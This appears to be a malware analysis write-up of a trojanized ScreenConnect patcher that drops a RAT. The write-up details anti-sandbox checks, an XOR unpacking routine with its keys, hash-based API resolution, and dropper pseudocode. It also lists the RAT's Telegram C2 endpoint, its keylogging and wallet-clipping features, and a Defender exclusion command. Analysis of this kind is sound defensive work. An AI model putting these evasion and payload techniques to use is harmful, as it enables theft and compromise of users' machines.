# Infection Chain — Step by Step

## Stage 1: Custom XOR Unpacker (Native C)

**Location**: Entry point → 0x53dfea (unpacker stub)

### 1.1 Anti-Analysis Checks
Before unpacking, the stub verifies it's not running in a sandbox/VM:

```
Check 1: malloc(100MB) / free → memory availability test
Check 2: SetErrorMode(SEM_FAILCRITICALERRORS) → sandbox detection
Check 3: VirtualAllocExNuma(-1, NULL, 1000, ...) → fails in emulators
Check 4: GetComputerNameA vs blocklist:
         - "NfZtFbPfH" (VM hostname)
         - "ELICZ" (analysis environment)
         - "tz" (minimal VM)
         - "MAIN" (sandbox)
Check 5: GetModuleFileNameA vs path blocklist:
         - "C:\...\mwsmpl.exe"
         - "C:\SELF.EXE"
         - "myapp.exe"
```
If ANY check matches → `ExitProcess(0)` immediately (silent exit, no crash).

### 1.2 XOR Decode
```
VirtualProtect(entry, 0xD353C, PAGE_READWRITE, &old)  // make code writable

key1 = 0xE583A01B   // rolling XOR key
key2 = 0x0DA45DD3   // skip control key
src  = 0x40100E     // source (packed data)
dst  = 0x401000     // destination (unpacked code)

for 865,596 bytes:
    *dst++ = *src ^ (key1 & 0xFF)
    key1 = ROL(key1, 5) * 7     // rotate left 5, multiply 7
    skip = key2 & 1
    key2 = ROR(key2, 1)
    src += (skip ? 2 : 1)       // skip source bytes based on key2

VirtualProtect(entry, 0xD353C, PAGE_EXECUTE_READ, &old)  // restore +x
```

### 1.3 Execute Unpacked Payload
```
CreateThread(NULL, 0, entry, NULL, 0, NULL)
while(1) Sleep(1000)  // wait forever
```

---

## Stage 2: File Dropper (Native C, 4 Functions)

**Location**: 0x401000 (unpacked)

### 2.1 Hash-Based API Resolution
All API calls go through a single resolver that uses ROR-13 hashes:

```
Walk PEB → LDR_DATA_TABLE_ENTRY → loaded modules
For each module: hash(name, ROR-13 + tolower) → match module hash
For each export: hash(name, ROR-13) → match function hash → return address
```

No import table entries → static analysis tools can't see what APIs are used.

### 2.2 Payload Extraction

```c
// Load required DLLs
LoadLibraryW(L"user32.dll");
LoadLibraryW(L"shell32.dll");
LoadLibraryW(L"shlwapi.dll");
LoadLibraryW(L"wininet.dll");

// Drop #1: WizWorm v4 RAT (disguised as "javaw.com")
write_file_to_disk(TEMP_DIR, javaw_com_data, 76800, L"javaw.com", EXECUTE);

// Drop #2: Real ScreenConnect Patcher
decompressed = RtlDecompressBuffer(LZNT1, compressed_data, 786578, 827392);
write_file_to_disk(TEMP_DIR, decompressed, 827392, 
                   L"ScreenConnect Patcher V3.exe", EXECUTE);
```

### 2.3 File Deployment Function
Supports 11 deployment paths:
| Mode | Target |
|---|---|
| 1 | %TEMP% |
| 2 | Current EXE directory |
| 3 | Desktop |
| 4 | Startup folder |
| 5 | Programs folder |
| 6 | Downloads |
| 7 | Documents |
| 8 | NetHood |
| 9 | AltStartup |
| 10 | Common AltStartup |
| 11 | C:\ (root) |

---

## Stage 3a: WizWorm v4 RAT (.NET, VB.NET)

**File**: `javaw.com` (76,800 bytes)  
**Disguised as**: "Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.44.35112"  
**Assembly**: javaw, GUID: bb11cdf9-cee3-43d7-a543-6d5e4e627559

### Class Structure (All Obfuscated)
```
Stub.znf0FlPSWS1X44GGlfHKpW          → Core module (24 methods)
Stub.IxWGzdwYyRAnAT7bux8ANk          → C2/Network (48 methods)
Stub.WGwqkdCzSHpwnlsxL5X2Xk          → Persistence/Installation
Stub.1tYJcDHyuMG1VrUjTiiujxAEu...    → Keylogger (LowLevelKeyboardProc)
Stub.ciByGbkdK89H0OpXYs08G4l1Kt...   → NativeMethods (P/Invoke)
Stub.SWFM5IU8iSVKvxeT085ezOkJiZ...   → NotificationForm (UI)
Stub.45OckD0gPqGvNcaUYgmazqFvgs...   → Anti-idle
l3KjadKNELmLssk7LZwiTRfOTTPoePI...   → Entry/Loader
```

### RAT Capabilities
1. **Telegram C2**: `https://api.telegram.org/bot{token}/sendMessage?chat_id={id}`
2. **Keylogger**: LowLevelKeyboardProc hook, tracks all keys including caps/shift
3. **Crypto Clipper**: Replaces BTC/ETH/TRX wallet addresses in clipboard
4. **Webcam**: avicap32.dll capture
5. **DDoS**: StartDDos/StopDDos commands
6. **Anti-kill**: RtlSetProcessIsCritical
7. **Anti-idle**: SetThreadExecutionState
8. **Defender bypass**: PowerShell Add-MpPreference -ExclusionPath
9. **Persistence**: Startup LNK + Registry
10. **Plugin system**: Dynamic loading via sendPlugin/savePlugin

---

## Stage 3b: ScreenConnect Patcher (.NET, VB.NET)

**File**: ScreenConnect Patcher V3.exe (827,392 bytes)

This is the **legitimate** component that:
- Patches ScreenConnect MSI installer (removes license checks)
- Patches installed ScreenConnect system (removes validation)
- Uses dnlib for .NET assembly manipulation

**This works normally** — the victim has no idea the RAT was also deployed.
